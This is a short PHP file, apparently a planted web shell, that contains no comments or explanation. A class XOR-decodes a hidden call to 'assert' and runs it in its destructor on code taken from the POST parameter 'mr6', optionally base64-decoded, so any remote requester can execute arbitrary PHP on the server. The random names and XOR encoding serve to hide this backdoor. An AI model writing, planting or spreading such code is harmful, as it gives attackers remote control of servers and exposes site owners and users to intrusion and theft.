<?php 
class CYEV { 
    function azZx() {
        $rDMF = "\xaf" ^ "\xce";
        $Srhv = "\xdb" ^ "\xa8";
        $qeiw = "\x4e" ^ "\x3d";
        $WZYu = "\xf3" ^ "\x96";
        $bteq = "\x62" ^ "\x10";
        $rPqK = "\x5a" ^ "\x2e";
        $DGtG =$rDMF.$Srhv.$qeiw.$WZYu.$bteq.$rPqK;
        return $DGtG;
    }
    function __destruct(){
        $LvaX=$this->azZx();
        @$LvaX($this->BC);
    }
}
$cyev = new CYEV();
@$cyev->BC = isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
?>